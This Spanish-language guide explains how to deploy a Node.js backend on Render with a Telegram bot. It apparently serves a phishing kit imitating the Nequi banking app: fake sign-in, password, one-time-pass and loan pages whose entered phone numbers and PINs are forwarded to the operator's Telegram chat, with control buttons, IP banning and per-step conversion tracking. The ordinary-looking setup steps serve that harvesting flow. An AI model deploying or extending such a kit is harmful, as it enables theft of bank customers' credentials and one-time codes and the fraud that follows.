# 🚀 Guía de Deployment en Render

## Paso 1: Preparar el Repositorio en GitHub

### 1.1 Crear estructura de carpetas
```
tu-repositorio/
├── server.js
├── package.json
├── README.md
├── .gitignore
└── public/
    ├── js/
    │   └── common.js
    ├── css/
    │   └── (todos tus archivos CSS)
    ├── assets/
    │   └── (todas tus imágenes)
    ├── accces-sign-in.php.html
    ├── access-sign-in-pass.php.html
    ├── loan-simulator.php.html
    ├── one-time-pass.php.html
    └── consignar.html
```

### 1.2 Crear archivo .gitignore
```
node_modules/
.env
.DS_Store
*.log
```



### 1.3 Subir a GitHub
```bash
git init
git add .
git commit -m "Initial commit - Sistema Nequi Dinámico"
git branch -M main
git remote add origin https://github.com/tu-usuario/tu-repo.git
git push -u origin main
```

## Paso 2: Crear Bot de Telegram

### 2.1 Crear el bot
1. Abrir Telegram y buscar `@BotFather`
2. Enviar `/newbot`
3. Dar un nombre al bot (ej: "Nequi Control Bot")
4. Dar un username (ej: "nequi_control_bot")
5. Guardar el **BOT_TOKEN** que te da BotFather

### 2.2 Obtener CHAT_ID
1. Buscar tu bot en Telegram y enviarle un mensaje
2. Ir a: `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates`
3. Buscar el campo `"chat":{"id": 123456789}`
4. Ese número es tu **CHAT_ID**

## Paso 3: Configurar Render

### 3.1 Crear cuenta en Render
1. Ir a https://render.com
2. Crear cuenta (puedes usar GitHub)
3. Verificar email

### 3.2 Crear Web Service
1. Click en "New +" → "Web Service"
2. Conectar tu repositorio de GitHub
3. Seleccionar el repositorio del proyecto

### 3.3 Configuración del Servicio

**Name:** `nequi-backend` (o el que prefieras)

**Environment:** `Node`

**Region:** `Oregon (US West)` o el más cercano

**Branch:** `main`

**Build Command:**
```bash
npm install
```

**Start Command:**
```bash
npm start
```

**Instance Type:** `Free`

### 3.4 Variables de Entorno

En la sección "Environment Variables", agregar:

| Key | Value |
|-----|-------|
| `BOT_TOKEN` | Tu token del bot de Telegram |
| `CHAT_ID` | Tu chat ID de Telegram |
| `RENDER_URL` | `https://tu-proyecto.onrender.com` |
| `NODE_VERSION` | `18.x` |

**IMPORTANTE:** El `RENDER_URL` será la URL que te asigne Render. 
Primero déjalo vacío, despliega, y luego actualízalo con la URL real.

### 3.5 Desplegar
1. Click en "Create Web Service"
2. Esperar a que termine el build (3-5 minutos)
3. Copiar la URL que te asigna Render

## Paso 4: Actualizar RENDER_URL

### 4.1 En Render
1. Ir a "Environment" en tu servicio
2. Editar la variable `RENDER_URL`
3. Poner tu URL: `https://tu-proyecto.onrender.com`
4. Guardar cambios (se redesplegará automáticamente)

### 4.2 En los archivos HTML
En todos los archivos HTML, buscar y reemplazar:
```javascript
const BACKEND_URL = 'https://tu-proyecto.onrender.com';
```
Por tu URL real de Render.

Hacer commit y push:
```bash
git add .
git commit -m "Actualizar BACKEND_URL"
git push
```

Render redesplegará automáticamente.

## Paso 5: Verificar Funcionamiento

### 5.1 Verificar servidor
```bash
curl https://tu-proyecto.onrender.com/
```

Deberías ver:
```json
{
  "ok": true,
  "service": "Nequi Backend Dinámico",
  "hasEnv": true,
  "status": "running"
}
```

### 5.2 Verificar webhook de Telegram
Ir a:
```
https://api.telegram.org/bot<BOT_TOKEN>/getWebhookInfo
```

Deberías ver tu URL de Render en `url`.

### 5.3 Probar flujo completo
1. Abrir `https://tu-proyecto.onrender.com/accces-sign-in.php.html`
2. Ingresar número de teléfono
3. Ingresar clave
4. Verificar que llegue mensaje a Telegram
5. Completar préstamo
6. Verificar que llegue mensaje con botones a Telegram
7. Probar botones

## Paso 6: Configuración Avanzada

### 6.1 Dominio Personalizado (Opcional)
1. En Render, ir a "Settings" → "Custom Domain"
2. Agregar tu dominio
3. Configurar DNS según instrucciones

### 6.2 Monitoreo
En Render, ir a "Logs" para ver:
- Solicitudes recibidas
- Errores
- Auto-pings

### 6.3 Escalado (Plan Pago)
Para más tráfico:
1. Ir a "Settings" → "Instance Type"
2. Cambiar a "Starter" ($7/mes)

## 🔧 Troubleshooting

### El servidor se duerme
**Problema:** Render pone en sleep después de 15 min de inactividad (plan Free)

**Solución:** El auto-ping cada 14 minutos lo previene automáticamente.

### Webhook no funciona
**Problema:** Telegram no recibe los callbacks

**Solución:**
```bash
# Eliminar webhook actual
curl "https://api.telegram.org/bot<BOT_TOKEN>/deleteWebhook"

# Reiniciar servicio en Render
# El webhook se reconfigurará automáticamente
```

### CORS errors
**Problema:** Errores de CORS en el navegador

**Solución:** Ya está configurado en `server.js`:
```javascript
const corsOptions = {
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
};
```

### No llegan mensajes a Telegram
**Verificar:**
1. BOT_TOKEN es correcto
2. CHAT_ID es correcto (número, no string)
3. Has iniciado conversación con el bot
4. El bot no está bloqueado

**Test:**
```bash
curl -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{"chat_id": <CHAT_ID>, "text": "Test"}'
```

### Banneo no funciona
**Problema:** Usuarios baneados pueden seguir accediendo

**Causa:** El banneo es temporal (se borra al reiniciar servidor)

**Solución para banneo permanente:**
1. Usar base de datos (MongoDB, PostgreSQL)
2. Guardar IPs baneadas en archivo JSON
3. Usar Redis para caché

## 📊 Monitoreo de Logs

### Ver logs en tiempo real
1. En Render Dashboard
2. Click en tu servicio
3. Click en "Logs"
4. Ver output en tiempo real

### Tipos de logs importantes
```
✅ Servidor activo en puerto 3000
📡 URL del servidor: https://...
✅ Webhook de Telegram configurado correctamente
🔄 Auto-ping realizado: [hora]
❌ Error en /step2-loan-second: [error]
```

## 🎯 Próximos Pasos

1. **Seguridad:**
   - Agregar rate limiting
   - Validar origen de requests
   - Encriptar datos sensibles

2. **Base de Datos:**
   - MongoDB Atlas (gratis)
   - PostgreSQL en Render
   - Redis para caché

3. **Analytics:**
   - Contador de visitantes
   - Conversión por paso
   - IPs únicas

4. **Notificaciones:**
   - Alertas por email
   - Logs estructurados
   - Dashboard de estadísticas

## 📞 Soporte

Si tienes problemas:
1. Revisar logs en Render
2. Verificar variables de entorno
3. Probar endpoints con curl
4. Verificar webhook de Telegram
5. Revisar código en GitHub

## ⚠️ Recordatorios Importantes

1. ✅ Nunca commitear `.env` con tokens reales
2. ✅ Actualizar `BACKEND_URL` en TODOS los HTML
3. ✅ Verificar que `public/` esté en la raíz
4. ✅ Probar flujo completo antes de usar en producción
5. ✅ El plan Free de Render tiene limitaciones:
   - Se duerme después de 15 min sin uso
   - 750 horas/mes gratis
   - Reinicio diario

## 🎓 Recursos Adicionales

- [Documentación de Render](https://render.com/docs)
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [Express.js Docs](https://expressjs.com/)
- [Node.js Best Practices](https://github.com/goldbergyoni/nodebestpractices)
